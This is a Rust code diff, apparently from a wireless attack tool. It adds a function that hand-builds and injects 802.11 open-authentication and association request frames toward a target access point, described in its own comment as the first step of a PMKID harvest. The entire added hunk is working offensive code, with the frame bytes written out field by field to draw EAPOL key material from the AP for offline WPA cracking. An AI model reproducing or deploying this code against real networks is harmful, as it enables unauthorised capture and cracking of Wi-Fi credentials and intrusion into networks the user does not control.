@@ -97,6 +97,57 @@ pub fn send(socket: &OwnedFd, frame: &[u8]) -> io::Result<()> {
     Ok(())
 }
 
+/// Inject an 802.11 open-system authentication request and an
+/// association request toward an AP, as the first step of the PMKID
+/// harvest (the AP answers EAPOL M1 to any associating station).
+///
+/// Builds both frames with a minimal radiotap preamble and sends them
+/// back to back. The caller listens for the AP's EAPOL response on the
+/// same socket.
+pub fn associate_open(
+    socket: &OwnedFd,
+    bssid: &[u8; 6],
+    station: &[u8; 6],
+) -> io::Result<()> {
+    // ── Authentication request (type/subtype 0xB0) ──
+    let mut auth = Vec::with_capacity(8 + 30);
+    auth.extend_from_slice(&[0x00, 0x00, 0x08, 0x00, 0, 0, 0, 0]); // radiotap
+    auth.push(0xb0); // frame control: authentication
+    auth.push(0x00);
+    auth.extend_from_slice(&[0x00, 0x00]); // duration
+    auth.extend_from_slice(bssid); // addr1: AP
+    auth.extend_from_slice(station); // addr2: us
+    auth.extend_from_slice(bssid); // addr3: BSSID
+    auth.extend_from_slice(&[0x00, 0x00]); // seq
+    auth.extend_from_slice(&[0x00, 0x00]); // auth algorithm: open
+    auth.extend_from_slice(&[0x01, 0x00]); // auth transaction seq: 1
+    auth.extend_from_slice(&[0x00, 0x00]); // status: success
+    send(socket, &auth)?;
+
+    // ── Association request (type/subtype 0x00) ──
+    let mut assoc = Vec::with_capacity(8 + 36);
+    assoc.extend_from_slice(&[0x00, 0x00, 0x08, 0x00, 0, 0, 0, 0]); // radiotap
+    assoc.push(0x00); // frame control: association request
+    assoc.push(0x00);
+    assoc.extend_from_slice(&[0x00, 0x00]); // duration
+    assoc.extend_from_slice(bssid); // addr1: AP
+    assoc.extend_from_slice(station); // addr2: us
+    assoc.extend_from_slice(bssid); // addr3: BSSID
+    assoc.extend_from_slice(&[0x00, 0x00]); // seq
+    assoc.extend_from_slice(&[0x01, 0x00]); // capability: ESS
+    assoc.extend_from_slice(&[0x01, 0x00]); // listen interval: 1 TU
+    // SSID IE: broadcast/empty (the AP knows its own ESSID)
+    assoc.push(0x00);
+    assoc.push(0x00);
+    // Supported rates IE (same set the beacon module uses)
+    assoc.push(0x01);
+    assoc.push(0x08);
+    assoc.extend_from_slice(&[0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c]);
+    send(socket, &assoc)?;
+
+    Ok(())
+}
+
 /// Resolve an interface name to its kernel index.
 fn interface_index(iface: &str) -> io::Result<u32> {
     let name = CString::new(iface).map_err(|_| {
